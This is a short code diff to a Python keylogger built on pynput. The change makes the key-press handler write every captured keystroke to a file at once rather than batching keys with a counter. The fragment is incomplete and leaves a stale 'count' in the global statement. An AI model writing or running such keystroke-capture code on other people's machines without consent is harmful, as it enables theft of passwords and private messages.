@@ -1,18 +1,14 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-count = 0
 keys = []
 
 def press(key):
     global keys, count
     keys.append(key)
-    count += 1
     print("{0} pressed".format(key))
-    if(count >= 1):  # recording keys every at every key presses to avoid loss
-        count = 0 #reset
-        write_to_file(keys)
-        keys = [] #reset
+    write_to_file(keys)
+    keys = [] #reset
 
 # end recording
 def release(key):
